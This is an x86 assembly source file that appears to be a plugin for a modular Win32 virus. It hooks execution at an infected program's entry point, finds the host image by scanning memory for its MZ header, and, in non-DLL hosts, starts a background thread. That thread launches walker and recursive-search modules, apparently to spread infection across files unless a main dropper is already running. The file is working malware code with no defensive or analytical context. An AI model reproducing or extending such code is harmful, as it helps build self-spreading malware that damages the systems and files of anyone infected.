   ; PERPROC
   ; ~~~~~~~
   ; - per each process: creates new thread, ...

   include                 INCLUDE\consts.inc
   include                 INCLUDE\seh.inc
   include                 INCLUDE\pe.inc
   include                 INCLUDE\mz.inc
   include                 k32man.inc
   include                 pentry.inc
   include                 system.inc
   include                 unprot.inc
   include                 maind.inc
   include                 recserch.inc
   include                 thread.inc
   include                 walker.inc

   include                 plugin.inc
                           PLUGIN_START    PERPROC, W32R3, PERMUTABLE

   handleevent:            hookevent EV_PENTRY_START_IN_PE, main
                           stc
                           retn

   main:                   pusha

                           seh_init

                           event   EV_UNPROT_ME

   ;;;;
                           mov     dx, -'ZM'
                           neg     dx
                           call    $+5
                           pop     eax
                           and     eax, 0FFFF0000h
                           add     eax, 65536
   __cycle:                sub     eax, 65536
                           cmp     [eax], dx
                           jne     __cycle
                           add     eax, [eax].mz_neptr
                           test    [eax].pe_exeflags, 2000h
                           jnz     __exit  ; DLL? -- skip new thread creation
   ;;;;

                           pusho   newthread
                           pop     ecx
                           event   EV_THREAD_NEW

   __exit:
                           seh_done

                           popa
                           stc     ; keep event
                           retn

   newthread:              pusha

                           event   EV_MAIND_GETSTATUS
                           jc      __run  ; no maind installed
                           or      eax, eax
                           jnz     __exit ; do not start per-process recserch,
                                          ; if main dropper is active now
   __run:                  event   EV_WALKER_RUN
                           event   EV_RECSERCH_RUN

   __exit:                 popa
                           retn    ; exit thread

                           PLUGIN_END
